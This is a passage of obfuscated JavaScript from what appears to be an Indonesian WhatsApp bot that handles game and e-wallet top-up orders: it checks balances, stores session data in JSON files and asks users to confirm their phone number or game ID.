reply('Maaf\x20saldo\x20anda\x20kurang');data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)]['selectedRowId'][_0x1ef6e3(0x15a)](_0x1ef6e3(0x11f))[0x1][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x0],data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)]=Number(msg[_0x1ef6e3(0x11e)]['listResponseMessage'][_0x1ef6e3(0x103)]['selectedRowId'][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]),data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x167)]=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x133)],data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0x154),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON['stringify'](data_topup,null,0x3)),conn[_0x1ef6e3(0x160)](from,{'text':_0x1ef6e3(0x123)});}else{if(isListMessage[_0x1ef6e3(0x152)](_0x1ef6e3(0xf0))){if(cekSaldo(sender,db_saldo)<Number(msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)]['selectedRowId'][_0x1ef6e3(0x15a)]('&harga=')[0x1]))return reply('Maaf\x20saldo\x20anda\x20kurang');data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]=msg['message'][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x11f))[0x1][_0x1ef6e3(0x15a)]('&harga=')[0x0],data_topup['data']['harga_topup']=Number(msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]),data_topup[_0x1ef6e3(0xe0)]['produk_topup']=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x133)],data_topup['session']=_0x1ef6e3(0x154),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),conn[_0x1ef6e3(0x160)](from,{'text':_0x1ef6e3(0x123)});}else{if(isListMessage['includes'](_0x1ef6e3(0x16b))){if(cekSaldo(sender,db_saldo)<Number(msg['message'][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]))return reply(_0x1ef6e3(0x132));data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)]['singleSelectReply'][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x11f))[0x1][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x0],data_topup['data'][_0x1ef6e3(0x100)]=Number(msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)]['singleSelectReply']['selectedRowId']['split'](_0x1ef6e3(0x141))[0x1]),data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x167)]=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x133)],data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0x154),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),conn[_0x1ef6e3(0x160)](from,{'text':_0x1ef6e3(0x104)});}else{if(isListMessage[_0x1ef6e3(0x152)]('OVO')){if(cekSaldo(sender,db_saldo)<Number(msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)]['selectedRowId'][_0x1ef6e3(0x15a)]('&harga=')[0x1]))return reply(_0x1ef6e3(0x132));data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)]('id=')[0x1][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x0],data_topup['data']['harga_topup']=Number(msg['message']['listResponseMessage'][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]),data_topup[_0x1ef6e3(0xe0)]['produk_topup']=msg[_0x1ef6e3(0x11e)]['listResponseMessage'][_0x1ef6e3(0x133)],data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0x154),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),conn[_0x1ef6e3(0x160)](from,{'text':'*Silahkan\x20Kirim\x20Nomor\x20Ovo\x20Kamu*\x0a*Wajib\x20Berawal\x20dari\x20628xx*'});}else{if(isListMessage[_0x1ef6e3(0x152)](_0x1ef6e3(0x139))){if(cekSaldo(sender,db_saldo)<Number(msg[_0x1ef6e3(0x11e)]['listResponseMessage'][_0x1ef6e3(0x103)]['selectedRowId'][_0x1ef6e3(0x15a)]('&harga=')[0x1]))return reply(_0x1ef6e3(0x132));data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x11f))[0x1][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x0],data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)]=Number(msg['message']['listResponseMessage'][_0x1ef6e3(0x103)]['selectedRowId'][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]),data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x167)]=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x133)],data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0x154),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),conn['sendMessage'](from,{'text':_0x1ef6e3(0x113)});}else{if(isListMessage[_0x1ef6e3(0x152)](_0x1ef6e3(0xfd))){if(cekSaldo(sender,db_saldo)<Number(msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)]['split'](_0x1ef6e3(0x141))[0x1]))return reply(_0x1ef6e3(0x132));data_topup['data'][_0x1ef6e3(0x166)]=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x11f))[0x1][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x0],data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)]=Number(msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]),data_topup[_0x1ef6e3(0xe0)]['produk_topup']=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x133)],data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0x154),fs[_0x1ef6e3(0x111)](topupPath+sender['split']('@')[0x0]+_0x1ef6e3(0xfb),JSON['stringify'](data_topup,null,0x3)),conn[_0x1ef6e3(0x160)](from,{'text':_0x1ef6e3(0xf9)});}else{if(isListMessage[_0x1ef6e3(0x152)](_0x1ef6e3(0x151))){if(cekSaldo(sender,db_saldo)<Number(msg[_0x1ef6e3(0x11e)]['listResponseMessage'][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]))return reply('Maaf\x20saldo\x20anda\x20kurang');data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]=msg[_0x1ef6e3(0x11e)]['listResponseMessage']['singleSelectReply'][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)]('id=')[0x1][_0x1ef6e3(0x15a)]('&harga=')[0x0],data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)]=Number(msg[_0x1ef6e3(0x11e)]['listResponseMessage'][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)]['split'](_0x1ef6e3(0x141))[0x1]),data_topup['data'][_0x1ef6e3(0x167)]=msg['message'][_0x1ef6e3(0xf4)][_0x1ef6e3(0x133)],data_topup[_0x1ef6e3(0xf2)]='INPUT-GAME-ID',fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+'.json',JSON['stringify'](data_topup,null,0x3)),conn[_0x1ef6e3(0x160)](from,{'text':_0x1ef6e3(0x12f)});}else{if(isListMessage[_0x1ef6e3(0x152)]('DANA')){if(cekSaldo(sender,db_saldo)<Number(msg[_0x1ef6e3(0x11e)]['listResponseMessage'][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]))return reply('Maaf\x20saldo\x20anda\x20kurang');data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x11f))[0x1][_0x1ef6e3(0x15a)]('&harga=')[0x0],data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)]=Number(msg[_0x1ef6e3(0x11e)]['listResponseMessage'][_0x1ef6e3(0x103)]['selectedRowId']['split'](_0x1ef6e3(0x141))[0x1]),data_topup[_0x1ef6e3(0xe0)]['produk_topup']=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x133)],data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0x154),fs['writeFileSync'](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),conn[_0x1ef6e3(0x160)](from,{'text':_0x1ef6e3(0x108)});}else{if(isListMessage[_0x1ef6e3(0x152)](_0x1ef6e3(0x134))){if(cekSaldo(sender,db_saldo)<Number(msg['message']['listResponseMessage']['singleSelectReply'][_0x1ef6e3(0x13f)]['split']('&harga=')[0x1]))return reply(_0x1ef6e3(0x132));data_topup[_0x1ef6e3(0xe0)]['id_topup']=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)]['split'](_0x1ef6e3(0x11f))[0x1][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x0],data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)]=Number(msg['message']['listResponseMessage'][_0x1ef6e3(0x103)]['selectedRowId']['split'](_0x1ef6e3(0x141))[0x1]),data_topup[_0x1ef6e3(0xe0)]['produk_topup']=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x133)],data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0x154),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+'.json',JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),conn['sendMessage'](from,{'text':'Silahkan\x20Kirim\x20*No\x20Hp\x20Kamu*\x0a*Wajib\x20berawal\x20dari\x20628xx*'});}else{if(isListMessage[_0x1ef6e3(0x152)]('FF')){if(cekSaldo(sender,db_saldo)<Number(msg['message']['listResponseMessage'][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)]['split'](_0x1ef6e3(0x141))[0x1]))return reply('Maaf\x20saldo\x20anda\x20kurang');data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]=msg['message'][_0x1ef6e3(0xf4)][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)]('id=')[0x1]['split'](_0x1ef6e3(0x141))[0x0],data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)]=Number(msg[_0x1ef6e3(0x11e)]['listResponseMessage'][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x1]),data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x167)]=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x133)],data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0x154),fs[_0x1ef6e3(0x111)](topupPath+sender['split']('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),conn['sendMessage'](from,{'text':_0x1ef6e3(0x13d)});}else{if(isListMessage['includes'](_0x1ef6e3(0x109))){if(cekSaldo(sender,db_saldo)<Number(msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)]['singleSelectReply'][_0x1ef6e3(0x13f)]['split']('&harga=')[0x1]))return reply(_0x1ef6e3(0x132));data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)]['singleSelectReply'][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)]('id=')[0x1][_0x1ef6e3(0x15a)](_0x1ef6e3(0x141))[0x0],data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)]=Number(msg['message']['listResponseMessage'][_0x1ef6e3(0x103)][_0x1ef6e3(0x13f)][_0x1ef6e3(0x15a)]('&harga=')[0x1]),data_topup[_0x1ef6e3(0xe0)]['produk_topup']=msg[_0x1ef6e3(0x11e)][_0x1ef6e3(0xf4)][_0x1ef6e3(0x133)],data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0x154),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),conn['sendMessage'](from,{'text':'Silahkan\x20Kirim\x20*ID\x20Mobile\x20Legends*'});}}}}}}}}}}}}}}}else{if(data_topup[_0x1ef6e3(0xf2)]===_0x1ef6e3(0x154)){if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]['includes'](_0x1ef6e3(0x140))){if(chats[_0x1ef6e3(0xf1)]===0x0)return;if(isNaN(chats))return reply(_0x1ef6e3(0x168));data_topup[_0x1ef6e3(0xe0)]['id_target']=Number(chats),data_topup[_0x1ef6e3(0xf2)]='KONFIRMASI-TOPUP',fs['writeFileSync'](topupPath+sender['split']('@')[0x0]+'.json',JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),reply(_0x1ef6e3(0x13c)+data_topup['ID']+_0x1ef6e3(0x16e)+data_topup['number'][_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)])+_0x1ef6e3(0xef)+data_topup[_0x1ef6e3(0xe0)]['produk_topup']+_0x1ef6e3(0x15f)+data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]+_0x1ef6e3(0x11c));}else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]['includes']('TTF')){if(chats[_0x1ef6e3(0xf1)]===0x0)return;if(isNaN(chats))return reply(_0x1ef6e3(0x168));data_topup['data'][_0x1ef6e3(0x13a)]=Number(chats),data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0xf5),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),reply(_0x1ef6e3(0x13c)+data_topup['ID']+'\x0a*Number:*\x20@'+data_topup[_0x1ef6e3(0x12d)][_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)])+'\x0a*Layanan:*\x20'+data_topup[_0x1ef6e3(0xe0)]['produk_topup']+_0x1ef6e3(0x15f)+data_topup['data'][_0x1ef6e3(0x13a)]+_0x1ef6e3(0x11c));}else{if(data_topup[_0x1ef6e3(0xe0)]['id_topup'][_0x1ef6e3(0x152)](_0x1ef6e3(0x10d))){if(chats[_0x1ef6e3(0xf1)]===0x0)return;if(isNaN(chats))return reply(_0x1ef6e3(0x168));data_topup[_0x1ef6e3(0xe0)]['id_target']=Number(chats),data_topup[_0x1ef6e3(0xf2)]='KONFIRMASI-TOPUP',fs['writeFileSync'](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON['stringify'](data_topup,null,0x3)),reply(_0x1ef6e3(0x13c)+data_topup['ID']+_0x1ef6e3(0x16e)+data_topup[_0x1ef6e3(0x12d)][_0x1ef6e3(0x15a)]('@')[0x0]+'\x0a*Harga:*\x20Rp'+toRupiah(data_topup[_0x1ef6e3(0xe0)]['harga_topup'])+_0x1ef6e3(0xef)+data_topup[_0x1ef6e3(0xe0)]['produk_topup']+_0x1ef6e3(0x15f)+data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]+_0x1ef6e3(0x11c));}else{if(data_topup[_0x1ef6e3(0xe0)]['id_topup'][_0x1ef6e3(0x152)](_0x1ef6e3(0x114))){if(chats['length']===0x0)return;if(isNaN(chats))return reply('Hanya\x20angka\x20dan\x20tanpa\x20spasi!');data_topup['data'][_0x1ef6e3(0x13a)]=Number(chats),data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0xf5),fs[_0x1ef6e3(0x111)](topupPath+sender['split']('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),reply(_0x1ef6e3(0x13c)+data_topup['ID']+_0x1ef6e3(0x16e)+data_topup[_0x1ef6e3(0x12d)]['split']('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)])+_0x1ef6e3(0xef)+data_topup['data'][_0x1ef6e3(0x167)]+_0x1ef6e3(0x15f)+data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]+_0x1ef6e3(0x11c));}else{if(data_topup['data'][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)]('AXTF')){if(chats[_0x1ef6e3(0xf1)]===0x0)return;if(isNaN(chats))return reply(_0x1ef6e3(0x168));data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]=Number(chats),data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0xf5),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON['stringify'](data_topup,null,0x3)),reply(_0x1ef6e3(0x13c)+data_topup['ID']+'\x0a*Number:*\x20@'+data_topup['number'][_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)])+_0x1ef6e3(0xef)+data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x167)]+_0x1ef6e3(0x15f)+data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]+_0x1ef6e3(0x11c));}else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]['includes'](_0x1ef6e3(0x16b))){if(chats[_0x1ef6e3(0xf1)]===0x0)return;if(isNaN(chats))return reply(_0x1ef6e3(0x142));data_topup['data'][_0x1ef6e3(0x13a)]=Number(chats),data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0xf5),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),reply(_0x1ef6e3(0x13c)+data_topup['ID']+_0x1ef6e3(0x16e)+data_topup['number'][_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)])+'\x0a*Layanan:*\x20'+data_topup['data'][_0x1ef6e3(0x167)]+_0x1ef6e3(0x15f)+data_topup[_0x1ef6e3(0xe0)]['id_target']+_0x1ef6e3(0x11c));}else{if(data_topup['data'][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)]('OVO')){if(chats['length']===0x0)return;if(isNaN(chats))return reply(_0x1ef6e3(0x142));data_topup['data'][_0x1ef6e3(0x13a)]=Number(chats),data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0xf5),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+'.json',JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),reply(_0x1ef6e3(0x13c)+data_topup['ID']+_0x1ef6e3(0x16e)+data_topup[_0x1ef6e3(0x12d)][_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)])+_0x1ef6e3(0xef)+data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x167)]+_0x1ef6e3(0x15f)+data_topup[_0x1ef6e3(0xe0)]['id_target']+_0x1ef6e3(0x11c));}else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)]('LINKAJA')){if(chats['length']===0x0)return;if(isNaN(chats))return reply(_0x1ef6e3(0x142));data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]=Number(chats),data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0xf5),fs[_0x1ef6e3(0x111)](topupPath+sender['split']('@')[0x0]+_0x1ef6e3(0xfb),JSON['stringify'](data_topup,null,0x3)),reply(_0x1ef6e3(0x13c)+data_topup['ID']+'\x0a*Number:*\x20@'+data_topup[_0x1ef6e3(0x12d)][_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)])+_0x1ef6e3(0xef)+data_topup['data']['produk_topup']+_0x1ef6e3(0x15f)+data_topup[_0x1ef6e3(0xe0)]['id_target']+'\x0a\x0aApakah\x20data\x20tersebut\x20sudah\x20benar?\x20akan\x20gagal\x20apabila\x20terdapat\x20kesalahan\x20input.\x0a\x0a_Ketik\x20*Y*\x20untuk\x20melanjutkan,\x20*N*\x20untuk\x20mengulangi\x20inputan_');}else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]['includes']('SHP')){if(chats[_0x1ef6e3(0xf1)]===0x0)return;if(isNaN(chats))return reply(_0x1ef6e3(0x142));data_topup[_0x1ef6e3(0xe0)]['id_target']=Number(chats),data_topup['session']=_0x1ef6e3(0xf5),fs['writeFileSync'](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON['stringify'](data_topup,null,0x3)),reply(_0x1ef6e3(0x13c)+data_topup['ID']+_0x1ef6e3(0x16e)+data_topup[_0x1ef6e3(0x12d)]['split']('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup['data'][_0x1ef6e3(0x100)])+'\x0a*Layanan:*\x20'+data_topup[_0x1ef6e3(0xe0)]['produk_topup']+'\x0a*No\x20Tujuan:*\x20'+data_topup['data'][_0x1ef6e3(0x13a)]+_0x1ef6e3(0x11c));}else{if(data_topup[_0x1ef6e3(0xe0)]['id_topup'][_0x1ef6e3(0x152)](_0x1ef6e3(0x151))){if(chats[_0x1ef6e3(0xf1)]===0x0)return;if(isNaN(chats))return reply('Hanya\x20angka!');data_topup['data']['id_target']=Number(chats),data_topup[_0x1ef6e3(0xf2)]='KONFIRMASI-TOPUP',fs['writeFileSync'](topupPath+sender['split']('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),reply(_0x1ef6e3(0x13c)+data_topup['ID']+'\x0a*Number:*\x20@'+data_topup[_0x1ef6e3(0x12d)][_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)])+_0x1ef6e3(0xef)+data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x167)]+'\x0a*No\x20Tujuan:*\x20'+data_topup['data']['id_target']+_0x1ef6e3(0x11c));}else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)](_0x1ef6e3(0x122))){if(chats['length']===0x0)return;if(isNaN(chats))return reply('Hanya\x20angka!');data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]=Number(chats),data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0xf5),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),reply('「\x20*KONFIRMASI-TOPUP*\x20」\x0a\x0a*ID:*\x20'+data_topup['ID']+_0x1ef6e3(0x16e)+data_topup[_0x1ef6e3(0x12d)][_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)])+_0x1ef6e3(0xef)+data_topup[_0x1ef6e3(0xe0)]['produk_topup']+_0x1ef6e3(0x15f)+data_topup[_0x1ef6e3(0xe0)]['id_target']+_0x1ef6e3(0x11c));}else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)][_0x1ef6e3(0x152)]('VGR')){if(chats[_0x1ef6e3(0xf1)]===0x0)return;if(isNaN(chats))return reply(_0x1ef6e3(0x142));data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]=Number(chats),data_topup['session']='KONFIRMASI-TOPUP';var data_name_ff=await stalkff(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]);if(data_name_ff[_0x1ef6e3(0xdc)]!==0xc8)return reply(_0x1ef6e3(0x130)),data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0x154),fs[_0x1ef6e3(0x111)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+'.json',JSON[_0x1ef6e3(0xec)](data_topup,null,0x3));fs['writeFileSync'](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),reply(_0x1ef6e3(0x13c)+data_topup['ID']+'\x0a*Number:*\x20@'+data_topup[_0x1ef6e3(0x12d)][_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup[_0x1ef6e3(0xe0)]['harga_topup'])+'\x0a*Layanan:*\x20'+data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x167)]+_0x1ef6e3(0x15f)+data_topup['data'][_0x1ef6e3(0x13a)]+_0x1ef6e3(0x11c));}else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]['includes']('FF')){if(chats['length']===0x0)return;if(isNaN(chats))return reply(_0x1ef6e3(0x142));data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x13a)]=Number(chats),data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0xf5);var data_name_ff=await stalkff(data_topup[_0x1ef6e3(0xe0)]['id_target']);if(data_name_ff[_0x1ef6e3(0xdc)]!==0xc8)return reply(_0x1ef6e3(0x130)),data_topup[_0x1ef6e3(0xf2)]=_0x1ef6e3(0x154),fs[_0x1ef6e3(0x111)](topupPath+sender['split']('@')[0x0]+'.json',JSON['stringify'](data_topup,null,0x3));fs['writeFileSync'](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb),JSON[_0x1ef6e3(0xec)](data_topup,null,0x3)),reply(_0x1ef6e3(0x13c)+data_topup['ID']+_0x1ef6e3(0x16e)+data_topup['number'][_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xf6)+toRupiah(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x100)])+_0x1ef6e3(0xef)+data_topup[_0x1ef6e3(0xe0)]['produk_topup']+_0x1ef6e3(0xeb)+data_name_ff[_0x1ef6e3(0x143)]+_0x1ef6e3(0xe3)+data_topup['data'][_0x1ef6e3(0x13a)]+_0x1ef6e3(0x11c));}else{if(data_topup[_0x1ef6e3(0xe0)][_0x1ef6e3(0x166)]['includes']('VMLSO')){if(chats[_0x1ef6e3(0xf1)]===0x0)return;if(isNaN(chats))return 